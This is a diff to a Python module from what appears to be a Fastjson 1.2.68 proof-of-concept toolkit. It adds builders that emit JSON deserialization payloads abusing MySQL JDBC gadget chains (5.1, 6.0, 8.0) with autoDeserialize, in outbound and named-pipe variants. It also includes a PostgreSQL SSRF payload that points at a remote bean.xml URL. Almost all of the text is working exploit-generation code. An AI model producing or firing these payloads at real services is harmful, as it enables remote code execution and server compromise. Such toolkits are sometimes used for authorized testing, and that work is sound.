@@ -365,29 +365,79 @@ def build_mysql_jdbc_51(
     host: str = "127.0.0.1",
     port: int = 3308,
     user: str = "fj1268",
+    *,
+    outbound: bool = True,
+    named_pipe_path: str = "/tmp/mysql.pcap",
 ) -> str:
     # 5 参构造：host, port, info, database, url
+    if outbound:
+        return (
+            "{"
+            f"{AC},"
+            '"@type":"com.mysql.jdbc.JDBC4Connection",'
+            f'"hostToConnectTo":"{_jesc(host)}",'
+            f'"portToConnectTo":{int(port)},'
+            '"info":{'
+            f'"user":"{_jesc(user)}",'
+            '"password":"pass",'
+            '"statementInterceptors":"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",'
+            '"autoDeserialize":"true",'
+            '"NUM_HOSTS":"1"'
+            "},"
+            '"databaseToConnectTo":"test",'
+            f'"url":"jdbc:mysql://{_jesc(host)}:{int(port)}/test"'
+            "}"
+        )
+    pipe = _jesc(named_pipe_path)
     return (
         "{"
         f"{AC},"
         '"@type":"com.mysql.jdbc.JDBC4Connection",'
-        f'"hostToConnectTo":"{_jesc(host)}",'
-        f'"portToConnectTo":{int(port)},'
+        '"hostToConnectTo":"127.0.0.1",'
+        '"portToConnectTo":3306,'
         '"info":{'
+        '"useSSL":"false",'
         f'"user":"{_jesc(user)}",'
-        '"password":"pass",'
+        f'"HOST":"{_jesc(host)}",'
         '"statementInterceptors":"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",'
         '"autoDeserialize":"true",'
-        '"NUM_HOSTS":"1"'
+        '"NUM_HOSTS":"1",'
+        '"socketFactory":"com.mysql.jdbc.NamedPipeSocketFactory",'
+        f'"namedPipePath":"{pipe}",'
+        '"DBNAME":"test"'
         "},"
         '"databaseToConnectTo":"test",'
-        f'"url":"jdbc:mysql://{_jesc(host)}:{int(port)}/test"'
+        '"url":""'
         "}"
     )
 
 
-def build_mysql_jdbc_60(jdbc_url: str) -> str:
-    url = _jesc(jdbc_url)
+def build_mysql_jdbc_60(
+    jdbc_url: str | None = None,
+    *,
+    host: str = "127.0.0.1",
+    port: int = 3308,
+    user: str = "fj1268",
+    outbound: bool = True,
+    named_pipe_path: str = "/tmp/mysql.pcap",
+) -> str:
+    if jdbc_url:
+        url = jdbc_url
+    elif outbound:
+        url = (
+            f"jdbc:mysql://{host}:{int(port)}/test?user={user}"
+            "&autoDeserialize=true"
+            "&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor"
+        )
+    else:
+        url = (
+            f"jdbc:mysql://{host}/test?useSSL=false&autoDeserialize=true"
+            "&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor"
+            f"&user={user}"
+            "&socketFactory=com.mysql.cj.core.io.NamedPipeSocketFactory"
+            f"&namedPipePath={named_pipe_path}"
+        )
+    esc = _jesc(url)
     return (
         "{"
         '"x1":{'
@@ -395,7 +445,7 @@ def build_mysql_jdbc_60(jdbc_url: str) -> str:
         '"@type":"com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection",'
         '"proxy":{'
         '"connectionString":{'
-        f'"url":"{url}"'
+        f'"url":"{esc}"'
         "}"
         "}"
         "}"
@@ -407,7 +457,36 @@ def build_mysql_jdbc_80(
     host: str = "127.0.0.1",
     port: int = 3308,
     user: str = "fj1268",
+    *,
+    outbound: bool = True,
+    named_pipe_path: str = "/tmp/mysql.pcap",
 ) -> str:
+    if outbound:
+        return (
+            "{"
+            '"x1":{'
+            f"{AC},"
+            '"@type":"com.mysql.cj.jdbc.ha.ReplicationMySQLConnection",'
+            '"proxy":{'
+            '"@type":"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy",'
+            '"connectionUrl":{'
+            '"@type":"com.mysql.cj.conf.url.ReplicationConnectionUrl",'
+            '"masters":[{}],'
+            '"slaves":[],'
+            '"properties":{'
+            f'"host":"{_jesc(host)}",'
+            f'"port":"{int(port)}",'
+            f'"user":"{_jesc(user)}",'
+            '"dbname":"test",'
+            '"password":"pass",'
+            '"queryInterceptors":"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor",'
+            '"autoDeserialize":"true"'
+            "}"
+            "}"
+            "}"
+            "}"
+            "}"
+        )
     return (
         "{"
         '"x1":{'
@@ -421,18 +500,74 @@ def build_mysql_jdbc_80(
         '"slaves":[],'
         '"properties":{'
         f'"host":"{_jesc(host)}",'
-        f'"port":"{int(port)}",'
         f'"user":"{_jesc(user)}",'
-        '"dbname":"test",'
-        '"password":"pass",'
         '"queryInterceptors":"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor",'
-        '"autoDeserialize":"true"'
+        '"autoDeserialize":"true",'
+        '"socketFactory":"com.mysql.cj.protocol.NamedPipeSocketFactory",'
+        f'"path":"{_jesc(named_pipe_path)}",'
+        '"maxAllowedPacket":"74996390",'
+        '"dbname":"test",'
+        '"useSSL":"false"'
         "}"
         "}"
         "}"
         "}"
         "}"
     )
+
+
+def _normalize_mysql_version(version: str | None, gadget_id: str) -> str:
+    from fastjson_toolkit.poc.v1_2_68.catalog import MYSQL_JDBC_ALIASES
+
+    if version:
+        v = version.strip()
+        if v in ("5.1", "51", "5.1.x"):
+            return "5.1"
+        if v in ("6.0", "60", "6.0.2", "6.0.3"):
+            return "6.0"
+        if v in ("8.0", "80", "≤8.0.19", "<=8.0.19"):
+            return "8.0"
+        return v
+    return MYSQL_JDBC_ALIASES.get(gadget_id, "5.1")
+
+
+def build_mysql_jdbc(
+    version: str = "5.1",
+    *,
+    host: str = "127.0.0.1",
+    port: int = 3308,
+    user: str = "fj1268",
+    jdbc_url: str | None = None,
+    outbound: bool = True,
+    named_pipe_path: str = "/tmp/mysql.pcap",
+) -> str:
+    ver = _normalize_mysql_version(version, "mysql_jdbc")
+    if ver == "5.1":
+        return build_mysql_jdbc_51(
+            host,
+            port,
+            user,
+            outbound=outbound,
+            named_pipe_path=named_pipe_path,
+        )
+    if ver == "6.0":
+        return build_mysql_jdbc_60(
+            jdbc_url,
+            host=host,
+            port=port,
+            user=user,
+            outbound=outbound,
+            named_pipe_path=named_pipe_path,
+        )
+    if ver == "8.0":
+        return build_mysql_jdbc_80(
+            host,
+            port,
+            user,
+            outbound=outbound,
+            named_pipe_path=named_pipe_path,
+        )
+    raise ValueError(f"未知 MySQL JDBC 版本: {version!r}（支持 5.1 / 6.0 / 8.0）")
 
 
 def build_postgresql_ssrf(
@@ -472,9 +607,15 @@ def build_payload(
     user: Optional[str] = None,
     jdbc_url: Optional[str] = None,
     socket_factory_arg: Optional[str] = None,
+    mysql_version: Optional[str] = None,
+    outbound: bool = True,
+    named_pipe_path: Optional[str] = None,
 ) -> str:
+    from fastjson_toolkit.poc.v1_2_68.catalog import MYSQL_JDBC_ALIASES
+
     entry = get_gadget(gadget)
     gid = entry.id
+    raw_id = str(gadget)
     fpath = file or f"/tmp/fj1268_{gid}"
     body = content if content is not None else f"FJ1268_{gid.upper()}"
 
@@ -506,16 +647,17 @@ def build_payload(
         )
     if gid == "io_read_echo":
         return build_io_read_echo(url or "file:///tmp/", bom_bytes)
-    if gid == "mysql_jdbc_51":
-        return build_mysql_jdbc_51(host or "127.0.0.1", port or 3308, user or "fj1268")
-    if gid == "mysql_jdbc_60":
-        default_url = (
-            "jdbc:mysql://127.0.0.1:3308/test?user=fj1268&autoDeserialize=true"
-            "&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor"
+    if gid == "mysql_jdbc" or raw_id in MYSQL_JDBC_ALIASES:
+        ver = _normalize_mysql_version(mysql_version, raw_id)
+        return build_mysql_jdbc(
+            ver,
+            host=host or ("xxx" if not outbound else "127.0.0.1"),
+            port=3308 if port is None else port,
+            user=user or ("mysql" if not outbound else "fj1268"),
+            jdbc_url=jdbc_url,
+            outbound=outbound,
+            named_pipe_path=named_pipe_path or "/tmp/mysql.pcap",
         )
-        return build_mysql_jdbc_60(jdbc_url or default_url)
-    if gid == "mysql_jdbc_80":
-        return build_mysql_jdbc_80(host or "127.0.0.1", port or 3308, user or "fj1268")
     if gid == "postgresql_ssrf":
         return build_postgresql_ssrf(
             socket_factory_arg or "http://host.docker.internal:18099/bean.xml",
